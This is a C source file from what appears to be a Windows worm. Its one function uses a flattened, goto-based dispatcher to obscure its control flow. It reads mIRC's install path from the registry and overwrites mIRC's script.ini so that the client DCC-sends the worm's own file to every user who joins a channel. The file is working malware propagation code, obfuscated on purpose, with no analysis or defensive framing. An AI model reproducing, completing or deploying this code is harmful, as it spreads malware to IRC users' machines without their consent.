#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

void _FindmIRC(void)
{
    volatile int dummy_state = 1;
    char mIrc[256];
    char mIrcPath[256];
    char mIrcFull[256] = {0};
    FILE *Script;
    int e;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 5) goto block5;
    if (dummy_state == 6) goto block6;
    if (dummy_state == 7) goto block7;
    if (dummy_state == 0) goto end;

block1:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIrc", 0, KEY_READ, &_hKey);
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    RegQueryValueExA(_hKey, "UninstallString", NULL, NULL, mIrc, (LPDWORD)&_mIrcPath);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    RegCloseKey(_hKey);
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    // Extract the mIRC installation path from the uninstall string (skip the first character)
    e = 1;
    while (mIrc[e] != '\0' && mIrc[e] != '.')
    {
        mIrcFull[e - 1] = mIrc[e];
        e++;
    }
    mIrcFull[e - 1] = '\0';   // truncate before the dot (e.g., "C:\...\mirc.exe" -> "C:\...\mirc")
    dummy_state = 5;
    goto dummy_dispatcher;

block5:
    // Find the last backslash and truncate to the directory
    e = strlen(mIrcFull);
    while (mIrcFull[e] != '\\')
    {
        mIrcFull[e] = '\0';
        e--;
    }
    dummy_state = 6;
    goto dummy_dispatcher;

block6:
    // Append "script.ini"
    strcat(mIrcFull, "script.ini");
    Script = fopen(mIrcFull, "wt");
    dummy_state = 7;
    goto dummy_dispatcher;

block7:
    fprintf(Script, "[script]\n");
    fprintf(Script, "n0=on 1:JOIN:#:{\n");
    fprintf(Script, "n1=/if ( $nick == $me ) { halt }\n");
    fprintf(Script, "n2=/dcc send $nick %s\n", _sysdoze2);   // use the global sysdoze2 (the worm's path)
    fprintf(Script, "n3=}\n");
    fclose(Script);
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
